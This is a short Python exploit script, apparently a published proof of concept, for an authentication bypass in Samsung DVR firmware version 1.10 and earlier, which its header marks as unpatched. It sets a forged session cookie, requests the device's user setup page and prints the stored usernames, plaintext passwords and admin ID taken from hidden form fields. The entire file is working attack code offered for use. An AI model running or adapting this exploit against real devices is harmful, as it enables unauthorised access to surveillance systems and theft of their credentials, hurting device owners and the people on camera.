#!/usr/bin/env python
#
#**************************************************************
#Title: Samsung DVR authentication bypass
#Version affected: firmware version <= 1.10
#Vendor: Samsung - www.samsung-security.com
#Discovered by: Andrea Fabrizi
#Email: andrea.fabrizi@gmail.com
#Web: http://www.andreafabrizi.it
#Twitter: @andreaf83
#Status: unpatched
#**************************************************************


import urllib2
import re
import sys

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print "usage: %s [TARGET]" % sys.argv[0]
        sys.exit(1)

    ip = sys.argv[1]
    headers = {"Cookie" : "DATA1=YWFhYWFhYWFhYQ==" }

    print "SAMSUNG DVR Authentication Bypass"
    print "Vulnerability and exploit by Andrea Fabrizi <andrea.fabrizi@gmail.com>\n"
    print "Target => %s\n" % ip

    #Dumping users
    print "##### DUMPING USERS ####"
    req = urllib2.Request("http://%s/cgi-bin/setup_user" % ip, None, headers)
    response = urllib2.urlopen(req)
    user_found = False

    for line in response.readlines():

        exp = re.search(".*<input type=\'hidden\' name=\'nameUser_Name_[0-9]*\' value=\'(.*)\'.*", line)
        if exp:
            print exp.group(1),

        exp = re.search(".*<input type=\'hidden\' name=\'nameUser_Pw_[0-9]*\' value=\'(.*)\'.*", line)
        if exp:
            print ": " + exp.group(1)
            user_found = True

        exp = re.search(".*<input type=hidden name=\'admin_id\' value=\'(.*)\'.*", line)
        if exp:
            print "Admin ID => %s" % exp.group(1)

    
    if not user_found:
        print "No user found."
